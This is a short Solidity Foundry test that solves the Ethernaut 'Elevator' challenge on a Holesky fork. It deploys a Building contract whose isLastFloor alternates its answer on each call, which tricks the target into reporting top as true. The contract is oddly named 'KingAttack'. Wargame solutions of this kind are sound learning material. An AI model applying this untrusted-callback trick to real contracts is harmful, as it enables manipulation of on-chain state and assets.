// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "../../lib/forge-std/src/Test.sol";
import {Vm} from "../../lib/forge-std/src/Vm.sol";
import {Elevator} from "../../src/Ethernaut/Elevator.sol";

contract KingAttack is Test {
    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("holesky"));
    }

    function testExploit() public {
        address playerAddress = 0xB3D6fac08D421164A414970D5225845b3A91F33F;

        vm.startPrank(playerAddress);
        Building building = new Building();
        building.goToTop();
        vm.stopPrank();

        Elevator elevator = Elevator(
            0xA7A3e457baB6d0a270879b90346bB3CaAbf26909
        );
        assertTrue(elevator.top());
    }
}

contract Building {
    bool flag = true;

    function isLastFloor(uint256 floor) external returns (bool) {
        flag = !flag;
        return flag;
    }

    function goToTop() public {
        Elevator elevator = Elevator(
            0xA7A3e457baB6d0a270879b90346bB3CaAbf26909
        );
        elevator.goTo(0);
    }
}
